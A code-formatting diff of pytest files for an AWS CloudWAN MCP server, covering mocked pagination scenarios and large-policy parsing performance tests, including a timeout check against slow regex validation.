     async def test_cross_region_pagination_token_isolation(self):
         """Test pagination token isolation across different regions."""
         region_tokens = {
-            'us-east-1': 'token-us-east-1-page2',
-            'us-west-2': 'token-us-west-2-page2',
-            'eu-west-1': 'token-eu-west-1-page2'
+            "us-east-1": "token-us-east-1-page2",
+            "us-west-2": "token-us-west-2-page2",
+            "eu-west-1": "token-eu-west-1-page2",
         }
 
         def region_specific_mock(service, region):
             mock_client = Mock()
 
             def region_pagination_call(**kwargs):
-                next_token = kwargs.get('NextToken')
+                next_token = kwargs.get("NextToken")
 
                 # Validate region-specific tokens
                 if next_token and region_tokens.get(region) != next_token:
                     raise ClientError(
                         {
-                            'Error': {
-                                'Code': 'InvalidNextToken',
-                                'Message': f'NextToken not valid for region {region}',
-                                'ValidRegions': [r for r in region_tokens.keys()]
+                            "Error": {
+                                "Code": "InvalidNextToken",
+                                "Message": f"NextToken not valid for region {region}",
+                                "ValidRegions": [r for r in region_tokens.keys()],
                             }
                         },
-                        'ListCoreNetworks'
+                        "ListCoreNetworks",
                     )
 
                 networks = [
-                    {
-                        'CoreNetworkId': f'core-network-{region}-{i}',
-                        'State': 'AVAILABLE',
-                        'Region': region
-                    } for i in range(100)
+                    {"CoreNetworkId": f"core-network-{region}-{i}", "State": "AVAILABLE", "Region": region}
+                    for i in range(100)
                 ]
 
-                response = {'CoreNetworks': networks}
+                response = {"CoreNetworks": networks}
                 if not next_token:  # First call for region
-                    response['NextToken'] = region_tokens[region]
+                    response["NextToken"] = region_tokens[region]
 
                 return response
 
             mock_client.list_core_networks.side_effect = region_pagination_call
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=region_specific_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=region_specific_mock):
             # Test different regions
-            regions = ['us-east-1', 'us-west-2', 'eu-west-1']
+            regions = ["us-east-1", "us-west-2", "eu-west-1"]
 
             for region in regions:
                 result = await list_core_networks(region=region)
 
                 parsed = json.loads(result)
-                assert parsed['success'] is True
-                assert parsed['region'] == region
-                assert all(region in network['CoreNetworkId'] for network in parsed['core_networks'])
+                assert parsed["success"] is True
+                assert parsed["region"] == region
+                assert all(region in network["CoreNetworkId"] for network in parsed["core_networks"])
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_multi_account_pagination_scenarios(self):
         """Test pagination scenarios across multiple AWS accounts."""
         account_data = {
-            '123456789012': {
-                'networks': [f'core-network-account1-{i}' for i in range(100)],
-                'token': 'token-account-123456789012'
+            "123456789012": {
+                "networks": [f"core-network-account1-{i}" for i in range(100)],
+                "token": "token-account-123456789012",
+            },
+            "210987654321": {
+                "networks": [f"core-network-account2-{i}" for i in range(150)],
+                "token": "token-account-210987654321",
             },
-            '210987654321': {
-                'networks': [f'core-network-account2-{i}' for i in range(150)],
-                'token': 'token-account-210987654321'
-            }
         }
 
         def multi_account_mock(service, region=None):
@@ -705,38 +678,35 @@
 
             def multi_account_call(**kwargs):
                 # Simulate cross-account access based on assumed role
-                current_account = '123456789012'  # Default account
+                current_account = "123456789012"  # Default account
 
                 # Check if NextToken indicates different account
-                next_token = kwargs.get('NextToken')
-                if next_token and 'account-210987654321' in next_token:
-                    current_account = '210987654321'
+                next_token = kwargs.get("NextToken")
+                if next_token and "account-210987654321" in next_token:
+                    current_account = "210987654321"
 
                 account_info = account_data[current_account]
                 networks = [
-                    {
-                        'CoreNetworkId': network_id,
-                        'State': 'AVAILABLE',
-                        'OwnerId': current_account
-                    } for network_id in account_info['networks']
+                    {"CoreNetworkId": network_id, "State": "AVAILABLE", "OwnerId": current_account}
+                    for network_id in account_info["networks"]
                 ]
 
-                response = {'CoreNetworks': networks[:100]}  # AWS page limit
-                if len(account_info['networks']) > 100:
-                    response['NextToken'] = account_info['token']
+                response = {"CoreNetworks": networks[:100]}  # AWS page limit
+                if len(account_info["networks"]) > 100:
+                    response["NextToken"] = account_info["token"]
 
                 return response
 
             mock_client.list_core_networks.side_effect = multi_account_call
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=multi_account_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=multi_account_mock):
             result = await list_core_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 100
-            assert all('account1' in network['CoreNetworkId'] for network in parsed['core_networks'])
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 100
+            assert all("account1" in network["CoreNetworkId"] for network in parsed["core_networks"])
 
 
 class TestPaginationPerformanceBenchmarks:
@@ -752,25 +722,26 @@
         for page_size in page_sizes:
             start_time = time.time()
 
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
 
                 # Generate large dataset for the page
                 networks = [
                     {
-                        'CoreNetworkId': f'core-network-perf-{i:06d}',
-                        'State': 'AVAILABLE',
-                        'Description': f'Performance test network {i}',
-                        'Tags': [
-                            {'Key': f'Tag{j}', 'Value': f'Value{j}'}
+                        "CoreNetworkId": f"core-network-perf-{i:06d}",
+                        "State": "AVAILABLE",
+                        "Description": f"Performance test network {i}",
+                        "Tags": [
+                            {"Key": f"Tag{j}", "Value": f"Value{j}"}
                             for j in range(10)  # 10 tags per network
-                        ]
-                    } for i in range(page_size)
+                        ],
+                    }
+                    for i in range(page_size)
                 ]
 
                 mock_client.list_core_networks.return_value = {
-                    'CoreNetworks': networks,
-                    'NextToken': f'token-page-size-{page_size}'
+                    "CoreNetworks": networks,
+                    "NextToken": f"token-page-size-{page_size}",
                 }
                 mock_get_client.return_value = mock_client
 
@@ -781,8 +752,8 @@
                 performance_metrics[page_size] = execution_time
 
                 parsed = json.loads(result)
-                assert parsed['success'] is True
-                assert len(parsed['core_networks']) == page_size
+                assert parsed["success"] is True
+                assert len(parsed["core_networks"]) == page_size
 
         # Verify performance scales reasonably
         assert all(time_taken < 5.0 for time_taken in performance_metrics.values())
@@ -791,39 +762,38 @@
     @pytest.mark.asyncio
     async def test_partial_success_pagination_handling(self):
         """Test handling of partial success scenarios in pagination."""
+
         def partial_success_mock(service, region=None):
             mock_client = Mock()
 
             def partial_success_call(**kwargs):
                 # Return partial results with warnings
                 networks = [
-                    {
-                        'CoreNetworkId': f'core-network-partial-{i}',
-                        'State': 'AVAILABLE' if i % 2 == 0 else 'UPDATING'
-                    } for i in range(50)
+                    {"CoreNetworkId": f"core-network-partial-{i}", "State": "AVAILABLE" if i % 2 == 0 else "UPDATING"}
+                    for i in range(50)
                 ]
 
                 return {
-                    'CoreNetworks': networks,
-                    'PartialFailures': [
+                    "CoreNetworks": networks,
+                    "PartialFailures": [
                         {
-                            'ResourceId': 'core-network-failed-1',
-                            'ErrorCode': 'AccessDenied',
-                            'ErrorMessage': 'Insufficient permissions to describe this resource'
+                            "ResourceId": "core-network-failed-1",
+                            "ErrorCode": "AccessDenied",
+                            "ErrorMessage": "Insufficient permissions to describe this resource",
                         }
                     ],
-                    'NextToken': 'partial-success-token'
+                    "NextToken": "partial-success-token",
                 }
 
             mock_client.list_core_networks.side_effect = partial_success_call
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=partial_success_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=partial_success_mock):
             result = await list_core_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 50
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 50
             # Current implementation doesn't expose partial failures, but structure is correct
 
     @pytest.mark.integration
@@ -838,40 +808,39 @@
 
             def time_bound_call(**kwargs):
                 current_time = time.time()
-                next_token = kwargs.get('NextToken')
+                next_token = kwargs.get("NextToken")
 
                 # Check if token has expired
-                if next_token and 'expired' not in next_token:
+                if next_token and "expired" not in next_token:
                     token_age = current_time - token_creation_time
                     if token_age > token_ttl:
                         raise ClientError(
                             {
-                                'Error': {
-                                    'Code': 'InvalidNextToken',
-                                    'Message': 'NextToken has expired',
-                                    'TokenAge': int(token_age),
-                                    'TokenTTL': token_ttl,
-                                    'RecommendedAction': 'Restart pagination'
+                                "Error": {
+                                    "Code": "InvalidNextToken",
+                                    "Message": "NextToken has expired",
+                                    "TokenAge": int(token_age),
+                                    "TokenTTL": token_ttl,
+                                    "RecommendedAction": "Restart pagination",
                                 }
                             },
-                            'ListCoreNetworks'
+                            "ListCoreNetworks",
                         )
 
                 return {
-                    'CoreNetworks': [
-                        {'CoreNetworkId': f'core-network-time-{i}', 'State': 'AVAILABLE'}
-                        for i in range(100)
+                    "CoreNetworks": [
+                        {"CoreNetworkId": f"core-network-time-{i}", "State": "AVAILABLE"} for i in range(100)
                     ],
-                    'NextToken': f'time-token-{int(current_time)}',
-                    'TokenExpiresAt': int(current_time + token_ttl)
+                    "NextToken": f"time-token-{int(current_time)}",
+                    "TokenExpiresAt": int(current_time + token_ttl),
                 }
 
             mock_client.list_core_networks.side_effect = time_bound_call
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=time_bound_token_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=time_bound_token_mock):
             result = await list_core_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert len(parsed['core_networks']) == 100
+            assert parsed["success"] is True
+            assert len(parsed["core_networks"]) == 100

--- cloudwan-mcp-server/tests/integration/test_policy_performance.py
+++ cloudwan-mcp-server/tests/integration/test_policy_performance.py
@@ -28,16 +28,38 @@
 
 
 # Test timeout constants for maintainability and consistency (configurable via environment variables)
-POLICY_PARSING_TIMEOUT = float(os.getenv('POLICY_PARSING_TIMEOUT', '30.0'))  # Default timeout for policy parsing operations
-REGEX_DOS_TIMEOUT = int(os.getenv('REGEX_DOS_TIMEOUT', '30'))  # Timeout for regex DOS prevention tests
+POLICY_PARSING_TIMEOUT = float(
+    os.getenv("POLICY_PARSING_TIMEOUT", "30.0")
+)  # Default timeout for policy parsing operations
+REGEX_DOS_TIMEOUT = int(os.getenv("REGEX_DOS_TIMEOUT", "30"))  # Timeout for regex DOS prevention tests
 
 # Edge region configurations for performance testing
 EDGE_REGIONS = [
-    "us-east", "us-west", "eu-west", "eu-central", "ap-southeast", "ap-northeast",
-    "ap-south", "ca-central", "sa-east", "af-south", "me-south", "ap-east",
-    "eu-north", "eu-south", "us-gov-east", "us-gov-west", "cn-north",
-    "cn-northwest", "ap-southeast", "ap-northeast", "eu-west", "us-west",
-    "us-east", "ap-south", "ca-central"
+    "us-east",
+    "us-west",
+    "eu-west",
+    "eu-central",
+    "ap-southeast",
+    "ap-northeast",
+    "ap-south",
+    "ca-central",
+    "sa-east",
+    "af-south",
+    "me-south",
+    "ap-east",
+    "eu-north",
+    "eu-south",
+    "us-gov-east",
+    "us-gov-west",
+    "cn-north",
+    "cn-northwest",
+    "ap-southeast",
+    "ap-northeast",
+    "eu-west",
+    "us-west",
+    "us-east",
+    "ap-south",
+    "ca-central",
 ]
 
 # AWS region names with numbers for testing
@@ -54,14 +76,14 @@
         """Test parsing of 10MB+ policy document with complex structure."""
         # Generate massive policy document (~10MB)
         massive_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': [f'{64512 + i}-{64512 + i + 99}' for i in range(0, 10000, 100)],
-                'edge-locations': []
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": [f"{64512 + i}-{64512 + i + 99}" for i in range(0, 10000, 100)],
+                "edge-locations": [],
             },
-            'segments': [],
-            'segment-actions': [],
-            'attachment-policies': []
+            "segments": [],
+            "segment-actions": [],
+            "attachment-policies": [],
         }
 
         # Add 1000 edge locations with detailed configuration
@@ -69,126 +91,114 @@
             for az_idx in range(8):  # 8 AZs per region
                 for instance_idx in range(5):  # 5 instances per AZ
                     edge_location = {
-                        'location': f'{EDGE_REGIONS[region_idx]}-{az_idx + 1}',
-                        'asn': 64512 + (region_idx * 1000) + (az_idx * 100) + instance_idx,
-                        'inside-cidr-blocks': [f'169.254.{region_idx}.{az_idx * 32 + instance_idx * 4}/30'],
-                        'tags': {
-                            'Region': f'region-{region_idx:02d}',
-                            'AvailabilityZone': f'az-{az_idx}',
-                            'Instance': f'instance-{instance_idx}',
-                            'Environment': 'production' if region_idx % 2 == 0 else 'staging',
-                            'CostCenter': f'cc-{region_idx % 10:03d}',
-                            'Team': f'team-{region_idx % 5:02d}',
-                            'Purpose': 'high-availability-backbone'
-                        }
+                        "location": f"{EDGE_REGIONS[region_idx]}-{az_idx + 1}",
+                        "asn": 64512 + (region_idx * 1000) + (az_idx * 100) + instance_idx,
+                        "inside-cidr-blocks": [f"169.254.{region_idx}.{az_idx * 32 + instance_idx * 4}/30"],
+                        "tags": {
+                            "Region": f"region-{region_idx:02d}",
+                            "AvailabilityZone": f"az-{az_idx}",
+                            "Instance": f"instance-{instance_idx}",
+                            "Environment": "production" if region_idx % 2 == 0 else "staging",
+                            "CostCenter": f"cc-{region_idx % 10:03d}",
+                            "Team": f"team-{region_idx % 5:02d}",
+                            "Purpose": "high-availability-backbone",
+                        },
                     }
-                    massive_policy['core-network-configuration']['edge-locations'].append(edge_location)
+                    massive_policy["core-network-configuration"]["edge-locations"].append(edge_location)
 
         # Add 50,000 segments with complex configurations
         for segment_idx in range(50000):
             segment = {
-                'name': f'segment-{segment_idx:06d}',
-                'description': f'Automatically generated segment {segment_idx} for performance testing with extensive configuration parameters and metadata',
-                'require-attachment-acceptance': segment_idx % 3 == 0,
-                'isolate-attachments': segment_idx % 5 == 0,
-                'allow-filter': [
-                    f'10.{(segment_idx // 256) % 256}.{segment_idx % 256}.0/24',
-                    f'172.{16 + ((segment_idx // 1000) % 16)}.{(segment_idx // 100) % 256}.0/20'
+                "name": f"segment-{segment_idx:06d}",
+                "description": f"Automatically generated segment {segment_idx} for performance testing with extensive configuration parameters and metadata",
+                "require-attachment-acceptance": segment_idx % 3 == 0,
+                "isolate-attachments": segment_idx % 5 == 0,
+                "allow-filter": [
+                    f"10.{(segment_idx // 256) % 256}.{segment_idx % 256}.0/24",
+                    f"172.{16 + ((segment_idx // 1000) % 16)}.{(segment_idx // 100) % 256}.0/20",
                 ],
-                'deny-filter': [f'192.168.{segment_idx % 256}.0/24'] if segment_idx % 7 == 0 else [],
-                'edge-locations': [
-                    f'{EDGE_REGIONS[segment_idx % 3]}-{(segment_idx % 8) + 1}'
-                ],
-                'tags': {
-                    'SegmentId': f'seg-{segment_idx:06d}',
-                    'Environment': ['prod', 'staging', 'dev'][segment_idx % 3],
-                    'Application': f'app-{segment_idx % 100:03d}',
-                    'Owner': f'team-{segment_idx % 50:02d}@company.com',
-                    'CostCenter': f'cc-{segment_idx % 200:03d}',
-                    'Purpose': 'automated-network-segmentation',
-                    'Compliance': ['pci', 'hipaa', 'sox'][segment_idx % 3],
-                    'DataClassification': ['public', 'internal', 'confidential'][segment_idx % 3]
-                }
+                "deny-filter": [f"192.168.{segment_idx % 256}.0/24"] if segment_idx % 7 == 0 else [],
+                "edge-locations": [f"{EDGE_REGIONS[segment_idx % 3]}-{(segment_idx % 8) + 1}"],
+                "tags": {
+                    "SegmentId": f"seg-{segment_idx:06d}",
+                    "Environment": ["prod", "staging", "dev"][segment_idx % 3],
+                    "Application": f"app-{segment_idx % 100:03d}",
+                    "Owner": f"team-{segment_idx % 50:02d}@company.com",
+                    "CostCenter": f"cc-{segment_idx % 200:03d}",
+                    "Purpose": "automated-network-segmentation",
+                    "Compliance": ["pci", "hipaa", "sox"][segment_idx % 3],
+                    "DataClassification": ["public", "internal", "confidential"][segment_idx % 3],
+                },
             }
-            massive_policy['segments'].append(segment)
+            massive_policy["segments"].append(segment)
 
         # Add 100,000 segment actions (sharing rules)
         for action_idx in range(100000):
             segment_action = {
-                'action': ['share', 'create-route'][action_idx % 2],
-                'segment': f'segment-{action_idx % 50000:06d}',
-                'share-with': [
-                    f'segment-{(action_idx + offset) % 50000:06d}'
+                "action": ["share", "create-route"][action_idx % 2],
+                "segment": f"segment-{action_idx % 50000:06d}",
+                "share-with": [
+                    f"segment-{(action_idx + offset) % 50000:06d}"
                     for offset in range(1, min(6, 50000 - (action_idx % 50000)))
-                ] if action_idx % 2 == 0 else None,
-                'destination-cidr-blocks': [
-                    f'10.{action_idx % 256}.0.0/16',
-                    f'172.{16 + ((action_idx // 1000) % 16)}.0.0/12'
-                ] if action_idx % 2 == 1 else None,
-                'mode': ['attachment-route', 'single-route'][action_idx % 2],
-                'via': {
-                    'network-function-groups': [f'nfg-{action_idx % 1000:04d}'],
-                    'with-edge-override': [
+                ]
+                if action_idx % 2 == 0
+                else None,
+                "destination-cidr-blocks": [
+                    f"10.{action_idx % 256}.0.0/16",
+                    f"172.{16 + ((action_idx // 1000) % 16)}.0.0/12",
+                ]
+                if action_idx % 2 == 1
+                else None,
+                "mode": ["attachment-route", "single-route"][action_idx % 2],
+                "via": {
+                    "network-function-groups": [f"nfg-{action_idx % 1000:04d}"],
+                    "with-edge-override": [
                         {
-                            'edge-sets': [[f'edge-{action_idx % 100:03d}']],
-                            'use-edge': f'edge-{(action_idx + 1) % 100:03d}'
+                            "edge-sets": [[f"edge-{action_idx % 100:03d}"]],
+                            "use-edge": f"edge-{(action_idx + 1) % 100:03d}",
                         }
-                    ]
-                } if action_idx % 10 == 0 else None
+                    ],
+                }
+                if action_idx % 10 == 0
+                else None,
             }
-            massive_policy['segment-actions'].append(segment_action)
+            massive_policy["segment-actions"].append(segment_action)
 
         # Add 75,000 attachment policies with complex conditions
         for policy_idx in range(75000):
             attachment_policy = {
-                'rule-number': policy_idx + 1,
-                'description': f'Complex attachment policy rule {policy_idx} with multiple conditions and nested logic structures',
-                'condition-logic': ['and', 'or'][policy_idx % 2],
-                'conditions': [
+                "rule-number": policy_idx + 1,
+                "description": f"Complex attachment policy rule {policy_idx} with multiple conditions and nested logic structures",
+                "condition-logic": ["and", "or"][policy_idx % 2],
+                "conditions": [
                     {
-                        'type': 'tag-value',
-                        'key': 'Environment',
-                        'value': ['production', 'staging', 'development'][policy_idx % 3],
-                        'operator': 'equals'
-                    },
-                    {
-                        'type': 'tag-exists',
-                        'key': 'Application',
-                        'operator': 'exists'
+                        "type": "tag-value",
+                        "key": "Environment",
+                        "value": ["production", "staging", "development"][policy_idx % 3],
+                        "operator": "equals",
                     },
-                    {
-                        'type': 'account-id',
-                        'value': f'{123456789000 + (policy_idx % 1000)}',
-                        'operator': 'equals'
-                    },
-                    {
-                        'type': 'resource-id',
-                        'value': f'vpc-{policy_idx:08d}*',
-                        'operator': 'starts-with'
-                    },
-                    {
-                        'type': 'region',
-                        'value': f'{AWS_REGIONS[policy_idx % 3]}',
-                        'operator': 'equals'
-                    }
+                    {"type": "tag-exists", "key": "Application", "operator": "exists"},
+                    {"type": "account-id", "value": f"{123456789000 + (policy_idx % 1000)}", "operator": "equals"},
+                    {"type": "resource-id", "value": f"vpc-{policy_idx:08d}*", "operator": "starts-with"},
+                    {"type": "region", "value": f"{AWS_REGIONS[policy_idx % 3]}", "operator": "equals"},
                 ],
-                'action': {
-                    'association-method': 'constant',
-                    'segment': f'segment-{policy_idx % 50000:06d}',
-                    'require-acceptance': policy_idx % 4 == 0,
-                    'tag-value-on-creation': {
-                        'AutoAttached': 'true',
-                        'PolicyId': f'policy-{policy_idx:06d}',
-                        'CreatedBy': 'automated-attachment-system',
-                        'Timestamp': '2024-01-01T00:00:00Z'
-                    }
-                }
+                "action": {
+                    "association-method": "constant",
+                    "segment": f"segment-{policy_idx % 50000:06d}",
+                    "require-acceptance": policy_idx % 4 == 0,
+                    "tag-value-on-creation": {
+                        "AutoAttached": "true",
+                        "PolicyId": f"policy-{policy_idx:06d}",
+                        "CreatedBy": "automated-attachment-system",
+                        "Timestamp": "2024-01-01T00:00:00Z",
+                    },
+                },
             }
-            massive_policy['attachment-policies'].append(attachment_policy)
+            massive_policy["attachment-policies"].append(attachment_policy)
 
         # Measure policy size
         policy_json = json.dumps(massive_policy)
-        policy_size_mb = len(policy_json.encode('utf-8')) / 1024 / 1024
+        policy_size_mb = len(policy_json.encode("utf-8")) / 1024 / 1024
 
         start_time = time.time()
         memory_before = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
@@ -203,18 +213,20 @@
         memory_usage = memory_after - memory_before
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert 'overall_status' in parsed
-        assert 'validation_results' in parsed
+        assert parsed["success"] is True
+        assert "overall_status" in parsed
+        assert "validation_results" in parsed
 
         # Performance requirements for 10MB+ policy (timeout configurable via env)
-        parsing_timeout = float(os.getenv('POLICY_PARSING_TIMEOUT', str(POLICY_PARSING_TIMEOUT)))
+        parsing_timeout = float(os.getenv("POLICY_PARSING_TIMEOUT", str(POLICY_PARSING_TIMEOUT)))
         assert policy_size_mb >= 10.0, f"Policy size {policy_size_mb:.1f}MB, expected >= 10MB"
-        assert parsing_time < parsing_timeout, f"10MB policy parsing took {parsing_time:.2f}s, expected < {parsing_timeout:.0f}s"
+        assert parsing_time < parsing_timeout, (
+            f"10MB policy parsing took {parsing_time:.2f}s, expected < {parsing_timeout:.0f}s"
+        )
         assert memory_usage < 500, f"Memory usage {memory_usage:.2f}MB, expected < 500MB (optimized from 1000MB)"
 
         # Validate policy structure was processed
-        validation_results = parsed['validation_results']
+        validation_results = parsed["validation_results"]
         assert len(validation_results) >= 4  # At least version, core-config, segments, actions
 
         print(f"Performance: {policy_size_mb:.1f}MB policy parsed in {parsing_time:.2f}s using {memory_usage:.1f}MB")
@@ -226,51 +238,44 @@
         """Test complex JSON schema validation with nested structures."""
         # Create policy with deeply nested and complex JSON structures
         complex_nested_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555'],
-                'edge-locations': [{'location': 'us-east-1', 'asn': 64512}],
-                'inside-cidr-blocks': ['169.254.0.0/16']
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555"],
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}],
+                "inside-cidr-blocks": ["169.254.0.0/16"],
             },
-            'segments': [
+            "segments": [
                 {
-                    'name': f'complex-segment-{i}',
-                    'advanced-configuration': {
-                        'level-1': {
-                            'level-2': {
-                                'level-3': {
-                                    'level-4': {
-                                        'level-5': {
-                                            'nested-arrays': [
+                    "name": f"complex-segment-{i}",
+                    "advanced-configuration": {
+                        "level-1": {
+                            "level-2": {
+                                "level-3": {
+                                    "level-4": {
+                                        "level-5": {
+                                            "nested-arrays": [
                                                 {
-                                                    'array-item': f'item-{j}',
-                                                    'nested-object': {
-                                                        'deep-property': f'value-{i}-{j}',
-                                                        'conditional-logic': {
-                                                            'if': {
-                                                                'condition': f'condition-{j}',
-                                                                'operator': 'equals'
-                                                            },
-                                                            'then': {
-                                                                'actions': [
-                                                                    f'action-{k}' for k in range(10)
-                                                                ]
-                                                            },
-                                                            'else': {
-                                                                'fallback': f'fallback-{i}-{j}'
-                                                            }
-                                                        }
-                                                    }
-                                                } for j in range(20)
+                                                    "array-item": f"item-{j}",
+                                                    "nested-object": {
+                                                        "deep-property": f"value-{i}-{j}",
+                                                        "conditional-logic": {
+                                                            "if": {"condition": f"condition-{j}", "operator": "equals"},
+                                                            "then": {"actions": [f"action-{k}" for k in range(10)]},
+                                                            "else": {"fallback": f"fallback-{i}-{j}"},
+                                                        },
+                                                    },
+                                                }
+                                                for j in range(20)
                                             ]
                                         }
                                     }
                                 }
                             }
                         }
-                    }
-                } for i in range(1000)
-            ]
+                    },
+                }
+                for i in range(1000)
+            ],
         }
 
         start_time = time.time()
@@ -285,7 +290,7 @@
         memory_usage = memory_after - memory_before
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
+        assert parsed["success"] is True
 
         # Complex nesting should be processed efficiently
         assert validation_time < 60.0, f"Complex validation took {validation_time:.2f}s"
@@ -297,30 +302,28 @@
     async def test_deep_policy_nesting_analysis(self):
         """Test analysis of deeply nested policy structures."""
         # Create policy with 20 levels of nesting
-        deep_nesting_policy = {'version': '2021.12'}
+        deep_nesting_policy = {"version": "2021.12"}
 
         def create_nested_structure(depth, max_depth=20):
             if depth >= max_depth:
-                return f'deep-value-at-level-{depth}'
+                return f"deep-value-at-level-{depth}"
             return {
-                f'level-{depth}': create_nested_structure(depth + 1, max_depth),
-                f'array-at-level-{depth}': [
-                    {
-                        f'item-{i}-at-level-{depth}': create_nested_structure(depth + 1, max_depth)
-                    } for i in range(5)
+                f"level-{depth}": create_nested_structure(depth + 1, max_depth),
+                f"array-at-level-{depth}": [
+                    {f"item-{i}-at-level-{depth}": create_nested_structure(depth + 1, max_depth)} for i in range(5)
                 ],
-                f'metadata-level-{depth}': {
-                    'depth': depth,
-                    'max_depth': max_depth,
-                    'path': f'root.level-{depth}',
-                    'properties': {f'prop-{j}': f'value-{j}-at-{depth}' for j in range(10)}
-                }
+                f"metadata-level-{depth}": {
+                    "depth": depth,
+                    "max_depth": max_depth,
+                    "path": f"root.level-{depth}",
+                    "properties": {f"prop-{j}": f"value-{j}-at-{depth}" for j in range(10)},
+                },
             }
 
-        deep_nesting_policy['core-network-configuration'] = {
-            'asn-ranges': ['64512-64555'],
-            'edge-locations': [{'location': 'us-east-1', 'asn': 64512}],
-            'deep-configuration': create_nested_structure(0, 20)
+        deep_nesting_policy["core-network-configuration"] = {
+            "asn-ranges": ["64512-64555"],
+            "edge-locations": [{"location": "us-east-1", "asn": 64512}],
+            "deep-configuration": create_nested_structure(0, 20),
         }
 
         start_time = time.time()
@@ -330,7 +333,7 @@
         parsing_time = end_time - start_time
         parsed = json.loads(result)
 
-        assert parsed['success'] is True
+        assert parsed["success"] is True
         assert parsing_time < 45.0, f"Deep nesting analysis took {parsing_time:.2f}s"
 
 
@@ -343,41 +346,40 @@
         """Test prevention of regex denial-of-service attacks."""
         # Create policy with potentially problematic regex patterns
         regex_dos_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555'],
-                'edge-locations': [{'location': 'us-east-1', 'asn': 64512}]
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555"],
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}],
             },
-            'segments': [
+            "segments": [
                 {
-                    'name': f'regex-test-{i}',
-                    'description': 'a' * 1000 + 'b' * 1000,  # Long strings that could cause regex issues
-                    'allow-filter': [
+                    "name": f"regex-test-{i}",
+                    "description": "a" * 1000 + "b" * 1000,  # Long strings that could cause regex issues
+                    "allow-filter": [
                         # Patterns that could be expensive to match
-                        '10.0.0.0/8',
-                        '172.16.0.0/12',
-                        '192.168.0.0/16'
-                    ]
-                } for i in range(1000)
+                        "10.0.0.0/8",
+                        "172.16.0.0/12",
+                        "192.168.0.0/16",
+                    ],
+                }
+                for i in range(1000)
             ],
-            'attachment-policies': [
+            "attachment-policies": [
                 {
-                    'rule-number': i,
-                    'conditions': [
+                    "rule-number": i,
+                    "conditions": [
                         {
-                            'type': 'tag-value',
-                            'key': 'Name',
+                            "type": "tag-value",
+                            "key": "Name",
                             # Potentially expensive regex patterns
-                            'value': 'a' * 100 + '.*' + 'b' * 100,
-                            'operator': 'contains'
+                            "value": "a" * 100 + ".*" + "b" * 100,
+                            "operator": "contains",
                         }
                     ],
-                    'action': {
-                        'association-method': 'constant',
-                        'segment': f'regex-test-{i % 1000}'
-                    }
-                } for i in range(5000)
-            ]
+                    "action": {"association-method": "constant", "segment": f"regex-test-{i % 1000}"},
+                }
+                for i in range(5000)
+            ],
         }
 
         start_time = time.time()
@@ -388,7 +390,7 @@
         execution_time = end_time - start_time
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
+        assert parsed["success"] is True
 
         # Should complete within reasonable time (regex DOS prevention)
         assert execution_time < REGEX_DOS_TIMEOUT, f"Regex validation took {execution_time:.2f}s, possible DOS"
@@ -399,40 +401,37 @@
         """Test compiled regex performance for policy validation."""
         # Create policy with patterns that benefit from regex compilation
         regex_benchmark_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555'],
-                'edge-locations': [{'location': 'us-east-1', 'asn': 64512}]
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555"],
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}],
             },
-            'attachment-policies': []
+            "attachment-policies": [],
         }
 
         # Add policies with repetitive patterns (should benefit from compilation)
         common_patterns = [
-            r'^vpc-[0-9a-f]{17}$',
-            r'^subnet-[0-9a-f]{17}$',
-            r'^igw-[0-9a-f]{17}$',
-            r'^rtb-[0-9a-f]{17}$',
-            r'^sg-[0-9a-f]{17}$'
+            r"^vpc-[0-9a-f]{17}$",
+            r"^subnet-[0-9a-f]{17}$",
+            r"^igw-[0-9a-f]{17}$",
+            r"^rtb-[0-9a-f]{17}$",
+            r"^sg-[0-9a-f]{17}$",
         ]
 
         for i in range(10000):
             policy = {
-                'rule-number': i + 1,
-                'conditions': [
+                "rule-number": i + 1,
+                "conditions": [
                     {
-                        'type': 'resource-id',
-                        'value': f'{["vpc", "subnet", "igw", "rtb", "sg"][i % 5]}-{i:017x}',
-                        'operator': 'matches-pattern',
-                        'pattern': common_patterns[i % 5]
+                        "type": "resource-id",
+                        "value": f"{['vpc', 'subnet', 'igw', 'rtb', 'sg'][i % 5]}-{i:017x}",
+                        "operator": "matches-pattern",
+                        "pattern": common_patterns[i % 5],
                     }
                 ],
-                'action': {
-                    'association-method': 'constant',
-                    'segment': f'segment-{i % 100:03d}'
-                }
+                "action": {"association-method": "constant", "segment": f"segment-{i % 100:03d}"},
             }
-            regex_benchmark_policy['attachment-policies'].append(policy)
